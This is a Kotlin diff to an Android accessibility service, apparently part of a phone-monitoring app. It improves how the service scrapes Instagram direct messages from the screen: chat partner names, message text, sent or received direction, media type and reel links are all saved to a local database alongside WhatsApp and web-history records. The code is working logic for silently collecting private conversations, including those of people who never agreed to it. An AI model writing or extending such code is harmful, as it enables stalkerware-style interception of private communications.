@@ -13,6 +13,7 @@ import com.spapp.monitoring.data.local.AppDatabase
 import com.spapp.monitoring.data.local.WebHistoryEntry
 import com.spapp.monitoring.data.local.WhatsAppMessageEntry
 import com.spapp.monitoring.data.local.InstagramMessageEntry
+import com.spapp.monitoring.collectors.WhatsAppNotificationListener
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -927,10 +928,31 @@ class BlockAccessibilityService : AccessibilityService() {
             val now = System.currentTimeMillis()
             val displayMetrics = resources.displayMetrics
 
-            fun extractReelUrl(txt: String?): String? {
-                if (txt.isNullOrBlank()) return null
-                val match = "(https?://(?:www\\.)?instagram\\.com/(?:reel|p|tv)/[a-zA-Z0-9_-]+)".toRegex().find(txt)
-                return match?.value
+            fun extractReelUrl(txt: String?): String? = WhatsAppNotificationListener.extractReelUrl(txt)
+
+            fun findReelUrlInNode(node: AccessibilityNodeInfo?, depth: Int = 0): String? {
+                if (node == null || depth > 4) return null
+                val t = node.text?.toString()
+                val cd = node.contentDescription?.toString()
+                extractReelUrl(t)?.let { return it }
+                extractReelUrl(cd)?.let { return it }
+                for (i in 0 until node.childCount) {
+                    val found = findReelUrlInNode(node.getChild(i), depth + 1)
+                    if (found != null) return found
+                }
+                return null
+            }
+
+            fun findReelUrlNearby(node: AccessibilityNodeInfo?): String? {
+                if (node == null) return null
+                findReelUrlInNode(node)?.let { return it }
+                node.parent?.let { parent ->
+                    findReelUrlInNode(parent)?.let { return it }
+                    parent.parent?.let { grandParent ->
+                        findReelUrlInNode(grandParent)?.let { return it }
+                    }
+                }
+                return null
             }
 
             // Find Direct Chat username in top action bar
@@ -957,51 +979,114 @@ class BlockAccessibilityService : AccessibilityService() {
             }?.text?.toString()?.trim()
 
             if (!chatTitle.isNullOrBlank()) {
-                val textList = mutableListOf<AccessibilityNodeInfo>()
-                fun collectMessageTexts(node: AccessibilityNodeInfo?) {
+                val candidateNodes = mutableListOf<AccessibilityNodeInfo>()
+                fun collectMessageNodes(node: AccessibilityNodeInfo?) {
                     if (node == null) return
                     if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) return
                     val t = node.text?.toString()?.trim()
+                    val cd = node.contentDescription?.toString()?.trim()
                     val rect = Rect()
                     node.getBoundsInScreen(rect)
-                    if (!t.isNullOrBlank() && rect.top > 120 && rect.bottom <= (displayMetrics.heightPixels - 100)) {
-                        if (t != chatTitle && !t.equals("Message...", ignoreCase = true) && !t.equals("Search", ignoreCase = true)) {
-                            textList.add(node)
+
+                    // Message bubbles appear between the top header (top > 140) and bottom message composer (bottom <= height - 120)
+                    if (rect.top > 140 && rect.bottom <= (displayMetrics.heightPixels - 120)) {
+                        val isTextTs = !t.isNullOrBlank() && WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(t)
+                        val isCdTs = !cd.isNullOrBlank() && WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(cd)
+
+                        if (!isTextTs && !isCdTs) {
+                            val candidateText = when {
+                                !t.isNullOrBlank() -> t
+                                !cd.isNullOrBlank() && (cd.contains("reel", ignoreCase = true) || cd.contains("photo", ignoreCase = true) || cd.contains("image", ignoreCase = true) || cd.contains("video", ignoreCase = true)) -> cd
+                                else -> null
+                            }
+                            if (!candidateText.isNullOrBlank() &&
+                                !candidateText.equals(chatTitle, ignoreCase = true) &&
+                                !candidateText.equals("Message...", ignoreCase = true) &&
+                                !candidateText.equals("Search", ignoreCase = true) &&
+                                !candidateText.equals("Instagram", ignoreCase = true)
+                            ) {
+                                candidateNodes.add(node)
+                            }
                         }
                     }
                     for (i in 0 until node.childCount) {
-                        collectMessageTexts(node.getChild(i))
+                        collectMessageNodes(node.getChild(i))
                     }
                 }
-                collectMessageTexts(root)
+                collectMessageNodes(root)
 
-                for (node in textList) {
-                    val rawText = node.text?.toString()?.trim() ?: continue
+                for (node in candidateNodes) {
+                    val t = node.text?.toString()?.trim()
+                    val cd = node.contentDescription?.toString()?.trim()
+                    val rawText = when {
+                        !t.isNullOrBlank() -> t
+                        !cd.isNullOrBlank() -> cd
+                        else -> continue
+                    }
                     if (rawText.isBlank()) continue
+                    if (WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(rawText)) continue
+
                     val rect = Rect()
                     node.getBoundsInScreen(rect)
-                    val isOutgoing = rect.left > (displayMetrics.widthPixels * 0.35f) || rawText.startsWith("You sent ", ignoreCase = true)
-                    val cleanText = if (rawText.startsWith("You sent ", ignoreCase = true)) rawText.substring(9).trim() else rawText
+                    val isOutgoing = rect.left > (displayMetrics.widthPixels * 0.35f) ||
+                                     rawText.startsWith("You sent ", ignoreCase = true) ||
+                                     rawText.startsWith("You: ", ignoreCase = true)
 
-                    val key = "ig|$chatTitle|$cleanText|$isOutgoing"
+                    val cleanText = when {
+                        rawText.startsWith("You sent ", ignoreCase = true) -> rawText.substring(9).trim()
+                        rawText.startsWith("You: ", ignoreCase = true) -> rawText.substring(5).trim()
+                        else -> rawText
+                    }
+                    if (WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(cleanText)) continue
+
+                    val reelUrl = findReelUrlNearby(node) ?: extractReelUrl(cleanText) ?: extractReelUrl(cd)
+                    val isReel = reelUrl != null ||
+                        cleanText.contains("reel", ignoreCase = true) ||
+                        (cd != null && cd.contains("reel", ignoreCase = true)) ||
+                        cleanText.contains("shared a reel", ignoreCase = true) ||
+                        cleanText.contains("sent a reel", ignoreCase = true)
+
+                    val isImage = !isReel && (
+                        cleanText.contains("photo", ignoreCase = true) ||
+                        cleanText.contains("image", ignoreCase = true) ||
+                        (cd != null && (cd.contains("photo", ignoreCase = true) || cd.contains("image", ignoreCase = true))) ||
+                        cleanText.contains("sent a photo", ignoreCase = true) ||
+                        cleanText.contains("shared a photo", ignoreCase = true) ||
+                        node.className?.toString()?.contains("ImageView", ignoreCase = true) == true
+                    )
+
+                    val isVideo = !isReel && !isImage && (
+                        cleanText.contains("video", ignoreCase = true) ||
+                        (cd != null && cd.contains("video", ignoreCase = true)) ||
+                        cleanText.contains("sent a video", ignoreCase = true)
+                    )
+
+                    val itemMediaType = when {
+                        isReel -> "reel"
+                        isImage -> "image"
+                        isVideo -> "video"
+                        else -> "text"
+                    }
+
+                    val finalText = when {
+                        isReel && (cleanText.isBlank() || cleanText.equals("reel", ignoreCase = true)) -> reelUrl ?: "Shared a Reel"
+                        isImage && (cleanText.isBlank() || cleanText.equals("photo", ignoreCase = true) || cleanText.equals("sent a photo", ignoreCase = true)) -> "Photo"
+                        isVideo && cleanText.isBlank() -> "Video"
+                        else -> cleanText
+                    }
+
+                    val key = "ig|$chatTitle|$finalText|$isOutgoing|$itemMediaType"
                     if (capturedWhatsAppMsgHashes.add(key)) {
-                        val reelUrl = extractReelUrl(cleanText)
-                        val mediaType = when {
-                            reelUrl != null || cleanText.contains("reel", ignoreCase = true) -> "reel"
-                            cleanText.contains("photo", ignoreCase = true) -> "image"
-                            cleanText.contains("video", ignoreCase = true) -> "video"
-                            else -> null
-                        }
                         entriesToInsert.add(
                             InstagramMessageEntry(
                                 chatName = chatTitle,
                                 sender = if (isOutgoing) "me" else chatTitle,
-                                messageText = cleanText,
+                                messageText = finalText,
                                 isOutgoing = isOutgoing,
                                 messageTimeEpochMs = now,
-                                mediaType = mediaType,
+                                mediaType = itemMediaType,
                                 reelUrl = reelUrl,
-                                targetAccount = com.spapp.monitoring.data.DeviceState(applicationContext).instagramAccount
+                                targetAccount = null
                             )
                         )
                     }
